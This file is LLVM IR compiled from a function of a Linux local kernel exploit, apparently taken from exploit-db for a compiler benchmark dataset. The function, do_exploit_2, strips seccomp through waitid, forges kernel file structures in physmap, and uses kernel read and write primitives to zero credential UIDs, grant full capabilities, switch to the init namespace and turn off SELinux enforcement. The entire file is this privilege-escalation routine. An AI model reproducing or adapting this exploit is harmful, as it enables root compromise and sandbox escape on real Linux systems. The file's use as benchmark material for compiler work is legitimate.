; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_43127.c_do_exploit_2.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_43127.c_do_exploit_2.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.PagePair = type { i64, i32 }

@SYS_waitid = common dso_local global i32 0, align 4
@P_ALL = common dso_local global i32 0, align 4
@OFFSET_OF_SECCOMP = common dso_local global i64 0, align 8
@WEXITED = common dso_local global i32 0, align 4
@OFFSET_OF_SECCOMP_MODE = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [12 x i8] c"/dev/random\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@errno = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [28 x i8] c"SECCOMP NOT ACTUALLY GONE!\0A\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"part 2 start\0A\00", align 1
@FMODE_LSEEK = common dso_local global i32 0, align 4
@OFFSET_OF_F_COUNT = common dso_local global i64 0, align 8
@f_op = common dso_local global i64* null, align 8
@OFFSET_OF_F_INODE = common dso_local global i64 0, align 8
@OFFSET_OF_IFLAGS = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [12 x i8] c"here we go\0A\00", align 1
@done_overwrite = common dso_local global i64 0, align 8
@OFFSET_OF_FILES = common dso_local global i64 0, align 8
@done_rooting = common dso_local global i32 0, align 4
@thread_to_be_root = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [16 x i8] c"pthread failed\0A\00", align 1
@write_5_thread = common dso_local global i32 0, align 4
@OFFSET_OF_PARENT = common dso_local global i64 0, align 8
@OFFSET_OF_TASK_CRED = common dso_local global i64 0, align 8
@OFFSET_OF_CRED_SECURITY = common dso_local global i64 0, align 8
@OFFSET_OF_F_SECURITY = common dso_local global i64 0, align 8
@OFFSET_OF_NSPROXY = common dso_local global i64 0, align 8
@OFFSET_OF_NS_COUNT = common dso_local global i64 0, align 8
@OFFSET_OF_FS = common dso_local global i64 0, align 8
@OFFSET_OF_FS_COUNT = common dso_local global i64 0, align 8
@OFFSET_OF_TASK_USAGE = common dso_local global i64 0, align 8
@kernel_base = common dso_local global i64 0, align 8
@SELINUX_ENFORCING_OFF = common dso_local global i64 0, align 8
@OFFSET_OF_THREAD_GROUP = common dso_local global i64 0, align 8
@OFFSET_OF_SIGNAL = common dso_local global i64 0, align 8
@CRED_UID_OFF = common dso_local global i64 0, align 8
@CRED_ID_SIZE = common dso_local global i32 0, align 4
@CRED_CAP_OFF = common dso_local global i64 0, align 8
@CRED_CAP_SIZE = common dso_local global i32 0, align 4
@INIT_USER_NS = common dso_local global i64 0, align 8
@CRED_NS_OFF = common dso_local global i64 0, align 8
@INIT_FS = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @do_exploit_2(i64 %0) #0 {
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.PagePair, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca [2 x i64], align 16
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  %14 = alloca i64, align 8
  %15 = alloca i64, align 8
  %16 = alloca i64, align 8
  %17 = alloca i64, align 8
  %18 = alloca i64, align 8
  %19 = alloca i64, align 8
  %20 = alloca [100 x i8], align 16
  %21 = alloca i64, align 8
  %22 = alloca i64, align 8
  store i64 %0, i64* %2, align 8
  %23 = call i32 @usleep(i32 100000)
  %24 = load i32, i32* @SYS_waitid, align 4
  %25 = load i32, i32* @P_ALL, align 4
  %26 = load i64, i64* %2, align 8
  %27 = load i64, i64* @OFFSET_OF_SECCOMP, align 8
  %28 = add i64 %26, %27
  %29 = sub i64 %28, 4
  %30 = load i32, i32* @WEXITED, align 4
  %31 = call i32 @syscall(i32 %24, i32 %25, i32 0, i64 %29, i32 %30, i32* null)
  %32 = load i32, i32* @SYS_waitid, align 4
  %33 = load i32, i32* @P_ALL, align 4
  %34 = load i64, i64* %2, align 8
  %35 = load i64, i64* @OFFSET_OF_SECCOMP_MODE, align 8
  %36 = add i64 %34, %35
  %37 = load i32, i32* @WEXITED, align 4
  %38 = call i32 @syscall(i32 %32, i32 %33, i32 0, i64 %36, i32 %37, i32* null)
  %39 = call i32 (...) @fork()
  store i32 %39, i32* %3, align 4
  %40 = load i32, i32* @O_RDONLY, align 4
  %41 = call i32 @open(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0), i32 %40)
  store i32 %41, i32* %4, align 4
  %42 = load i32, i32* @errno, align 4
  %43 = icmp eq i32 %42, 1
  br i1 %43, label %44, label %47

44:                                               ; preds = %1
  %45 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0))
  %46 = call i32 @exit(i32 -1) #3
  unreachable

47:                                               ; preds = %1
  %48 = load i32, i32* %3, align 4
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %52, label %50

50:                                               ; preds = %47
  %51 = call i32 @exit(i32 0) #3
  unreachable

52:                                               ; preds = %47
  %53 = call i32 @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0))
  %54 = call i32 @get_physmap(%struct.PagePair* %5)
  %55 = getelementptr inbounds %struct.PagePair, %struct.PagePair* %5, i32 0, i32 0
  %56 = load i64, i64* %55, align 8
  %57 = inttoptr i64 %56 to i8*
  %58 = call i32 @memset(i8* %57, i32 65, i32 4096)
  %59 = getelementptr inbounds %struct.PagePair, %struct.PagePair* %5, i32 0, i32 0
  %60 = load i64, i64* %59, align 8
  store i64 %60, i64* %6, align 8
  %61 = load i64, i64* %6, align 8
  %62 = inttoptr i64 %61 to i32*
  store i32 100, i32* %62, align 4
  %63 = getelementptr inbounds %struct.PagePair, %struct.PagePair* %5, i32 0, i32 1
  %64 = load i32, i32* %63, align 8
  %65 = add nsw i32 %64, 256
  %66 = sext i32 %65 to i64
  %67 = load i64, i64* %6, align 8
  %68 = add i64 %67, 32
  %69 = inttoptr i64 %68 to i64*
  store i64 %66, i64* %69, align 8
  %70 = getelementptr inbounds %struct.PagePair, %struct.PagePair* %5, i32 0, i32 0
  %71 = load i64, i64* %70, align 8
  %72 = add i64 %71, 256
  store i64 %72, i64* %7, align 8
  %73 = load i64, i64* %7, align 8
  %74 = inttoptr i64 %73 to i32*
  store i32 2, i32* %74, align 4
  %75 = getelementptr inbounds %struct.PagePair, %struct.PagePair* %5, i32 0, i32 1
  %76 = load i32, i32* %75, align 8
  %77 = add nsw i32 %76, 512
  %78 = sext i32 %77 to i64
  %79 = load i64, i64* %7, align 8
  %80 = add i64 %79, 8
  %81 = inttoptr i64 %80 to i64*
  store i64 %78, i64* %81, align 8
  %82 = getelementptr inbounds %struct.PagePair, %struct.PagePair* %5, i32 0, i32 0
  %83 = load i64, i64* %82, align 8
  %84 = add i64 %83, 512
  store i64 %84, i64* %8, align 8
  %85 = getelementptr inbounds %struct.PagePair, %struct.PagePair* %5, i32 0, i32 1
  %86 = load i32, i32* %85, align 8
  %87 = add nsw i32 %86, 768
  %88 = sext i32 %87 to i64
  %89 = load i64, i64* %8, align 8
  %90 = inttoptr i64 %89 to i64*
  store i64 %88, i64* %90, align 8
  %91 = getelementptr inbounds %struct.PagePair, %struct.PagePair* %5, i32 0, i32 0
  %92 = load i64, i64* %91, align 8
  %93 = add i64 %92, 768
  store i64 %93, i64* %9, align 8
  %94 = getelementptr inbounds %struct.PagePair, %struct.PagePair* %5, i32 0, i32 1
  %95 = load i32, i32* %94, align 8
  %96 = add nsw i32 %95, 1024
  %97 = sext i32 %96 to i64
  %98 = load i64, i64* %9, align 8
  %99 = add i64 %98, 40
  %100 = inttoptr i64 %99 to i64*
  store i64 %97, i64* %100, align 8
  %101 = load i32, i32* @FMODE_LSEEK, align 4
  %102 = load i64, i64* %9, align 8
  %103 = add i64 %102, 68
  %104 = inttoptr i64 %103 to i32*
  store i32 %101, i32* %104, align 4
  %105 = load i64, i64* %9, align 8
  %106 = load i64, i64* @OFFSET_OF_F_COUNT, align 8
  %107 = add i64 %105, %106
  %108 = inttoptr i64 %107 to i64*
  store i64 100, i64* %108, align 8
  %109 = getelementptr inbounds %struct.PagePair, %struct.PagePair* %5, i32 0, i32 0
  %110 = load i64, i64* %109, align 8
  %111 = add i64 %110, 1024
  %112 = inttoptr i64 %111 to i64*
  store i64* %112, i64** @f_op, align 8
  %113 = getelementptr inbounds %struct.PagePair, %struct.PagePair* %5, i32 0, i32 1
  %114 = load i32, i32* %113, align 8
  %115 = add nsw i32 %114, 1280
  %116 = sext i32 %115 to i64
  %117 = load i64, i64* %9, align 8
  %118 = load i64, i64* @OFFSET_OF_F_INODE, align 8
  %119 = add i64 %117, %118
  %120 = inttoptr i64 %119 to i64*
  store i64 %116, i64* %120, align 8
  %121 = getelementptr inbounds %struct.PagePair, %struct.PagePair* %5, i32 0, i32 0
  %122 = load i64, i64* %121, align 8
  %123 = add i64 %122, 1280
  store i64 %123, i64* %10, align 8
  %124 = load i64, i64* %10, align 8
  %125 = load i64, i64* @OFFSET_OF_IFLAGS, align 8
  %126 = add i64 %124, %125
  %127 = inttoptr i64 %126 to i32*
  store i32 512, i32* %127, align 4
  %128 = call i32 @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0))
  store i64 0, i64* @done_overwrite, align 8
  %129 = load i64, i64* %2, align 8
  %130 = load i64, i64* @OFFSET_OF_FILES, align 8
  %131 = add i64 %129, %130
  %132 = getelementptr inbounds [2 x i64], [2 x i64]* %11, i64 0, i64 0
  store i64 %131, i64* %132, align 16
  %133 = getelementptr inbounds %struct.PagePair, %struct.PagePair* %5, i32 0, i32 1
  %134 = load i32, i32* %133, align 8
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds [2 x i64], [2 x i64]* %11, i64 0, i64 1
  store i64 %135, i64* %136, align 8
  store i32 0, i32* @done_rooting, align 4
  %137 = load i32, i32* @thread_to_be_root, align 4
  %138 = call i64 @pthread_create(i32* %12, i32* null, i32 %137, i64* null)
  %139 = icmp ne i64 %138, 0
  br i1 %139, label %140, label %143

140:                                              ; preds = %52
  %141 = call i32 @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0))
  %142 = call i32 @exit(i32 -1) #3
  unreachable

143:                                              ; preds = %52
  %144 = load i32, i32* @write_5_thread, align 4
  %145 = getelementptr inbounds [2 x i64], [2 x i64]* %11, i64 0, i64 0
  %146 = call i64 @pthread_create(i32* %12, i32* null, i32 %144, i64* %145)
  %147 = icmp ne i64 %146, 0
  br i1 %147, label %148, label %151

148:                                              ; preds = %143
  %149 = call i32 @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0))
  %150 = call i32 @exit(i32 -1) #3
  unreachable

151:                                              ; preds = %143
  br label %152

152:                                              ; preds = %156, %151
  %153 = load i64, i64* @done_overwrite, align 8
  %154 = icmp ne i64 %153, 0
  %155 = xor i1 %154, true
  br i1 %155, label %156, label %157

156:                                              ; preds = %152
  br label %152

157:                                              ; preds = %152
  %158 = load i64, i64* %2, align 8
  %159 = load i64, i64* @OFFSET_OF_PARENT, align 8
  %160 = add i64 %158, %159
  %161 = call i64 @read_addr(i64 %160)
  store i64 %161, i64* %13, align 8
  %162 = load i64, i64* %2, align 8
  %163 = load i64, i64* @OFFSET_OF_TASK_CRED, align 8
  %164 = add i64 %162, %163
  %165 = call i64 @read_addr(i64 %164)
  store i64 %165, i64* %14, align 8
  %166 = load i64, i64* %14, align 8
  %167 = load i64, i64* @OFFSET_OF_CRED_SECURITY, align 8
  %168 = add i64 %166, %167
  %169 = call i64 @read_addr(i64 %168)
  store i64 %169, i64* %15, align 8
  %170 = load i64, i64* %15, align 8
  %171 = load i64, i64* %9, align 8
  %172 = load i64, i64* @OFFSET_OF_F_SECURITY, align 8
  %173 = add i64 %171, %172
  %174 = inttoptr i64 %173 to i64*
  store i64 %170, i64* %174, align 8
  %175 = load i64, i64* %13, align 8
  %176 = load i64, i64* @OFFSET_OF_NSPROXY, align 8
  %177 = add i64 %175, %176
  %178 = call i64 @read_addr(i64 %177)
  store i64 %178, i64* %16, align 8
  %179 = load i64, i64* %2, align 8
  %180 = load i64, i64* @OFFSET_OF_NSPROXY, align 8
  %181 = add i64 %179, %180
  %182 = load i64, i64* %16, align 8
  %183 = call i32 @write_addr(i64 %181, i64 %182)
  %184 = load i64, i64* %16, align 8
  %185 = load i64, i64* @OFFSET_OF_NS_COUNT, align 8
  %186 = add nsw i64 %184, %185
  %187 = call i32 @write_addr4(i64 %186, i32 286331153)
  %188 = load i64, i64* %13, align 8
  %189 = load i64, i64* @OFFSET_OF_FS, align 8
  %190 = add i64 %188, %189
  %191 = call i64 @read_addr(i64 %190)
  store i64 %191, i64* %17, align 8
  %192 = load i64, i64* %2, align 8
  %193 = load i64, i64* @OFFSET_OF_FS, align 8
  %194 = add i64 %192, %193
  %195 = load i64, i64* %17, align 8
  %196 = call i32 @write_addr(i64 %194, i64 %195)
  %197 = load i64, i64* %17, align 8
  %198 = load i64, i64* @OFFSET_OF_FS_COUNT, align 8
  %199 = add nsw i64 %197, %198
  %200 = call i32 @write_addr4(i64 %199, i32 286331153)
  %201 = load i64, i64* %2, align 8
  %202 = load i64, i64* @OFFSET_OF_TASK_USAGE, align 8
  %203 = add i64 %201, %202
  %204 = call i32 @write_addr4(i64 %203, i32 69905)
  %205 = load i64, i64* @kernel_base, align 8
  %206 = load i64, i64* @SELINUX_ENFORCING_OFF, align 8
  %207 = add i64 %205, %206
  %208 = call i32 @write_addr4(i64 %207, i32 0)
  %209 = load i64, i64* %2, align 8
  %210 = load i64, i64* @OFFSET_OF_THREAD_GROUP, align 8
  %211 = add i64 %209, %210
  %212 = call i64 @read_addr(i64 %211)
  %213 = load i64, i64* @OFFSET_OF_THREAD_GROUP, align 8
  %214 = sub i64 %212, %213
  store i64 %214, i64* %18, align 8
  %215 = load i64, i64* %18, align 8
  %216 = load i64, i64* %2, align 8
  %217 = icmp eq i64 %215, %216
  br i1 %217, label %218, label %226

218:                                              ; preds = %157
  %219 = load i64, i64* %2, align 8
  %220 = load i64, i64* @OFFSET_OF_THREAD_GROUP, align 8
  %221 = add i64 %219, %220
  %222 = add i64 %221, 8
  %223 = call i64 @read_addr(i64 %222)
  %224 = load i64, i64* @OFFSET_OF_THREAD_GROUP, align 8
  %225 = sub i64 %223, %224
  store i64 %225, i64* %18, align 8
  br label %226

226:                                              ; preds = %218, %157
  %227 = load i64, i64* %18, align 8
  %228 = load i64, i64* @OFFSET_OF_SIGNAL, align 8
  %229 = add i64 %227, %228
  %230 = call i64 @read_addr(i64 %229)
  store i64 %230, i64* %19, align 8
  %231 = load i64, i64* %2, align 8
  %232 = load i64, i64* @OFFSET_OF_SIGNAL, align 8
  %233 = add i64 %231, %232
  %234 = load i64, i64* %19, align 8
  %235 = call i32 @write_addr(i64 %233, i64 %234)
  %236 = getelementptr inbounds [100 x i8], [100 x i8]* %20, i64 0, i64 0
  %237 = call i32 @memset(i8* %236, i32 0, i32 100)
  %238 = load i64, i64* %14, align 8
  %239 = load i64, i64* @CRED_UID_OFF, align 8
  %240 = add i64 %238, %239
  %241 = getelementptr inbounds [100 x i8], [100 x i8]* %20, i64 0, i64 0
  %242 = load i32, i32* @CRED_ID_SIZE, align 4
  %243 = call i32 (i64, ...) @mem_write(i64 %240, i8* %241, i32 %242)
  %244 = getelementptr inbounds [100 x i8], [100 x i8]* %20, i64 0, i64 0
  %245 = call i32 @memset(i8* %244, i32 255, i32 100)
  %246 = load i64, i64* %14, align 8
  %247 = load i64, i64* @CRED_CAP_OFF, align 8
  %248 = add i64 %246, %247
  %249 = getelementptr inbounds [100 x i8], [100 x i8]* %20, i64 0, i64 0
  %250 = load i32, i32* @CRED_CAP_SIZE, align 4
  %251 = call i32 (i64, ...) @mem_write(i64 %248, i8* %249, i32 %250)
  %252 = load i64, i64* @INIT_USER_NS, align 8
  %253 = load i64, i64* @kernel_base, align 8
  %254 = add i64 %252, %253
  store i64 %254, i64* %21, align 8
  %255 = load i64, i64* %14, align 8
  %256 = load i64, i64* @CRED_NS_OFF, align 8
  %257 = add i64 %255, %256
  %258 = call i32 (i64, ...) @mem_write(i64 %257, i64* %21, i32 8)
  %259 = load i64, i64* @INIT_FS, align 8
  %260 = load i64, i64* @kernel_base, align 8
  %261 = add i64 %259, %260
  store i64 %261, i64* %22, align 8
  %262 = load i64, i64* %18, align 8
  %263 = load i64, i64* @OFFSET_OF_FS, align 8
  %264 = add i64 %262, %263
  %265 = load i64, i64* %22, align 8
  %266 = call i32 @write_addr(i64 %264, i64 %265)
  store i32 1, i32* @done_rooting, align 4
  %267 = call i32 @sleep(i32 1000000)
  ret void
}

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @syscall(i32, i32, i32, i64, i32, i32*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @get_physmap(%struct.PagePair*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare !callback !2 dso_local i64 @pthread_create(i32*, i32*, i32, i64*) #1

declare dso_local i64 @read_addr(i64) #1

declare dso_local i32 @write_addr(i64, i64) #1

declare dso_local i32 @write_addr4(i64, i32) #1

declare dso_local i32 @mem_write(i64, ...) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
